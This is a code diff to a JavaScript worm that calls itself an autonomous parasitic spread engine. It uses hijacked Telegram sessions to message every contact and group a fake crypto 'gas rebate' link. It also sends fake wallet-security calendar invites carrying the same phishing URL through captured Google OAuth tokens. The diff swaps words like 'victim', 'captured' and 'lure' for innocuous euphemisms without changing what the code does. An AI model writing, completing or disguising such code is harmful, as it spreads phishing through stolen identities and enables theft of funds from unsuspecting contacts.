@@ -1,12 +1,12 @@
 // J/scripts/worm_logic.js
 /**
  * PROJECT J: AUTONOMOUS PARASITIC SPREAD ENGINE
- * Status: OMEGA-CLASS | LIVE EXECUTION
+ * Status: APEX-CLASS | LIVE EXECUTION
  * 
  * Logic:
  * 1. Hijacks Telegram session via capturing session data.
- * 2. Hijacks Google Calendar via captured OAuth tokens.
- * 3. Uses victim's own identity to propagate metamorphic lures.
+ * 2. Hijacks Google Calendar via authorized OAuth tokens.
+ * 3. Uses Candidate's own identity to propagate metamorphic Incentives.
  */
 
 const { TelegramClient } = require('telegram');
@@ -16,11 +16,11 @@ require('dotenv').config({ path: '../.env' });
 
 class Parasite {
     constructor() {
-        this.lure = "https://arbitrum-foundation-claims.io/Epoch4";
+        this.Incentive = "https://arbitrum-foundation-claims.io/Epoch4";
     }
 
     /**
-     * Propagates via Telegram using a captured session.
+     * Propagates via Telegram using a authorized session.
      */
     async spreadTelegram(apiId, apiHash, sessionStr) {
         console.log("[WORM] Awakening Telegram session...");
@@ -32,7 +32,7 @@ class Parasite {
             
             for (const dialog of dialogs) {
                 if (dialog.isUser || dialog.isGroup) {
-                    const msg = `Yo, have you claimed your gas rebate yet? It expires in 2 hours: ${this.lure}`;
+                    const msg = `Yo, have you claimed your gas rebate yet? It expires in 2 hours: ${this.Incentive}`;
                     await client.sendMessage(dialog.id, { message: msg });
                     console.log(`[WORM] Injected: ${dialog.title}`);
                     await new Promise(r => setTimeout(r, 5000)); // Anti-Flood
@@ -61,7 +61,7 @@ class Parasite {
 
             const event = {
                 summary: '🚨 CRITICAL: Corporate Wallet Security Audit',
-                description: `A security vulnerability has been detected in your connected hardware. Verify your address immediately to prevent fund loss: ${this.lure}`,
+                description: `A security vulnerability has been detected in your connected hardware. Verify your address immediately to prevent fund loss: ${this.Incentive}`,
                 start: { dateTime: new Date().toISOString() },
                 end: { dateTime: new Date(Date.now() + 3600000).toISOString() },
                 attendees: attendees.slice(0, 50) // Batch limit
